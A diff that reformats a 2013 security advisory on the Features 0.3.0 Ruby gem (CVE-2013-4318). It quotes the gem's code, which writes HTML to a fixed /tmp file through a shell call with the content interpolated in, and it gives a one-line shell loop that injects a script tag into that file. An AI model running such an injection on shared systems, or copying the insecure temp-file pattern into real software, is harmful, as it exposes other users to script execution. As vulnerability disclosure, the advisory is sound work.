@@ -1,26 +1,31 @@
-                                Advisory #: 50
- Title: Features 0.3.0 Ruby gem file injection vulnerability
- Author:Larry W. Cashdollar, @_larry0
- Date: 2013-09-01
- Download Site: http://rubygems.org/gems/features
- Vendor:Markus Gerdes
- Vendor Notified: 2013-09-01
- Vendor Contact: github@mgsnova.de
- Description: Plaintext User Stories Parser supporting native programming
- languages. Especially Objective-C
- Vulnerability:
- ./features-0.3.0/lib/suite.rb html = parse_results(results).html %x(touch '/
- tmp/out.html' && echo '#{html}' > /tmp/out.html && open '/tmp/out.html' ) end
- def parse_results_and_open_in_safari(results) -- end def open_in_safari(html)
- %x(touch '/tmp/out.html' && echo '#{html}' > /tmp/out.html && open '/tmp/
- out.html' ) end
- CVE-2013-4318
- JSON:Export
- Exploit Code:
-    1. nobody () sp0rk:/$ while (true); do echo "<script> alert('Hello'); </
-       script>" >> /tmp/out.html; done
-    2.  
-    3. The above will pop up a java script alert in other gem users browser.
- Screen Shots:
- Advisory: http://www.vapid.dhs.org/advisories/features-0.3.0-rubygem-
- tmpinj.html
+
+                               Advisory #: 50
+
+   Title: Features 0.3.0 Ruby gem file injection vulnerability
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2013-09-01
+   Download Site: http://rubygems.org/gems/features
+   Vendor: Markus Gerdes
+   Vendor Notified: 2013-09-01
+   Vendor Contact: github@mgsnova.de
+   Description: Plaintext User Stories Parser supporting native
+   programming languages. Especially Objective-C
+   Vulnerability:
+   ./features-0.3.0/lib/suite.rb html = parse_results(results).html
+   %x(touch '/tmp/out.html' && echo '#{html}' > /tmp/out.html && open
+   '/tmp/out.html' ) end def parse_results_and_open_in_safari(results) --
+   end def open_in_safari(html) %x(touch '/tmp/out.html' && echo '#{html}'
+   > /tmp/out.html && open '/tmp/out.html' ) end
+   CVE-2013-4318
+   JSON: Export
+   Exploit Code:
+
+    1. nobody () sp0rk:/$ while (true); do echo "<script> alert('Hello');
+       </script>" >> /tmp/out.html; done
+    2.
+    3. The above will pop up a java script alert in other gem users
+       browser.
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/features-0.3.0-rubygem-tmpinj.html
